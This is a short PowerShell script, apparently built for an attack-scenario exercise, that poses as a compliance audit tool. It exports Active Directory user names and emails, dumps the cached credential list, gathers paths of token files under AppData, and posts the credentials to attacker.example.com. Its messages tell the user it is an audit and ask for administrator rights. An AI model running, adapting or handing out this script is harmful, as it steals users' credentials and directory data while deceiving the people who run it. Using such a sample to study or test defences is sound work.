# Compliance Audit Script - PowerShell
# This script is used in the malware signing attack scenario
# Disguised as a compliance auditing tool

param(
    [string]$TargetPath = $env:USERPROFILE
)

Write-Host "[COMPLIANCE] Starting audit process..."
Write-Host "[INFO] Target: $TargetPath"

# Enumerate domain users
$users = Get-ADUser -Filter * -Properties SamAccountName, EmailAddress | Select-Object -First 50
$users | Export-Csv "$env:TEMP\domain_users.csv" -NoTypeInformation

# Dump cached credentials
cmdkey /list | Out-File "$env:TEMP\credentials.txt"

# Collect VPN/tokens
Get-ChildItem "$env:APPDATA\Microsoft\Interactive*\" -Recurse -ErrorAction SilentlyContinue | 
    Select-Object FullName, Length | Export-Csv "$env:TEMP\tokens.csv" -NoTypeInformation

# Exfiltrate via HTTP
$body = Get-Content "$env:TEMP\credentials.txt" -Raw
Invoke-WebRequest -Uri "http://attacker.example.com/audit" -Method POST -Body $body -ErrorAction SilentlyContinue

Write-Host "[COMPLETE] Audit report generated. Please run as administrator for full scan."
